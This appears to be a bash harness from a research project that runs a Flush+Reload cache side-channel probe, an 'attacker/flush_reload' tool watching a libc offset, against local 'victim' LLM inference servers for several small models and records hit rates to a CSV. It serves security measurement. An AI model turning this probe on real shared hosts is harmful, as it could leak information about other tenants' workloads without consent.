
#!/bin/bash

MODELS=(
    "pythia-70m"
    "distilgpt2"
    "gpt2"
    "opt-125m"
    "gpt-neo-125m"
    "pythia-160m"
    "gpt2-medium"
    "bloom-560m"
)

RESULTS_FILE="flush_reload_bare_metal_results.csv"
echo "model,hits,misses,hit_rate,threshold" > $RESULTS_FILE

for MODEL in "${MODELS[@]}"; do
    echo "=========================================="
    echo "Testing: $MODEL"
    echo "=========================================="
    
    # Start victim server with this model
    cd ~/llm_sidechannel_final/victim_service
    MODEL_NAME="$MODEL" USE_REAL_MODELS=1 .venv/bin/python -m uvicorn server:app --host 0.0.0.0 --port 8000 &
    SERVER_PID=$!
    
    # Wait for server to load model
    echo "Waiting for model to load..."
    sleep 45
    
    # Verify server is up
    curl -s http://localhost:8000/health || { echo "Server failed"; kill $SERVER_PID 2>/dev/null; continue; }
    echo ""
    
    cd ~/llm_sidechannel_final/attacker
    
    # Run calibration first
    THRESHOLD=$(./flush_reload 5000 0 2 /lib/x86_64-linux-gnu/libc.so.6 0xad650 2>&1 | grep "Selected threshold" | awk '{print $3}')
    echo "Threshold: $THRESHOLD"
    
    # Run attack with requests
    ./flush_reload 100000 $THRESHOLD 1 /lib/x86_64-linux-gnu/libc.so.6 0xad650 > /tmp/fr_output.txt 2>&1 &
    ATTACKER_PID=$!
    
    # Send 200 requests in parallel
    for i in {1..200}; do
        curl -s -X POST http://localhost:8000/generate \
            -H "Content-Type: application/json" \
            -d '{"prompt": "Hello world this is a test prompt", "max_new_tokens": 20}' > /dev/null &
    done
    
    wait $ATTACKER_PID
    
    # Parse results
    HITS=$(grep "Hits:" /tmp/fr_output.txt | awk '{print $2}')
    MISSES=$(grep "Misses:" /tmp/fr_output.txt | awk '{print $2}')
    HIT_RATE=$(grep "Hits:" /tmp/fr_output.txt | grep -oP '\(\K[0-9.]+')
    
    echo "$MODEL,$HITS,$MISSES,$HIT_RATE,$THRESHOLD" >> $RESULTS_FILE
    echo "Result: $HITS hits ($HIT_RATE%)"
    
    # Kill server
    kill $SERVER_PID 2>/dev/null
    pkill -f uvicorn
    sleep 5
done

echo ""
echo "=========================================="
echo "FINAL RESULTS"
echo "=========================================="
cat $RESULTS_FILE
